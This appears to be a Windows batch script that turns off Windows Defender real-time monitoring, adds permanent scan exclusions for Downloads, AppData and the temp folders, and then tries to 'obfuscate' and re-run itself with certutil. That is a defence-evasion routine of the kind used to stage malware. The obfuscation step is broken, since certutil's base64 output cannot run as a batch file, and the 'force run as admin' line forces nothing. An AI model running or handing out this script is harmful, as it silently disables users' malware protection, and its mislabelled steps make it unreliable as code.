@echo off
:: Run this script as administrator

:: Force run as admin
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

:: Disable Windows Defender real-time monitoring
powershell -inputformat none -outputformat none -NonInteractive -Command Set-MpPreference -DisableRealtimeMonitoring $true

:: Add exclusions for specified folders
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%USERPROFILE%\Downloads"
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%USERPROFILE%\AppData"
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%APPDATA%"
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%TEMP%"
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%TMP%"

:: Re-enable Windows Defender real-time monitoring
powershell -inputformat none -outputformat none -NonInteractive -Command Set-MpPreference -DisableRealtimeMonitoring $false

:: Obfuscate the script
certutil -encode "%~f0" "%TEMP%\obfuscated.bat"

:: Run the obfuscated script
"%TEMP%\obfuscated.bat"

:: Clean up the obfuscated script
del "%TEMP%\obfuscated.bat"

echo Batch script completed successfully!
pause
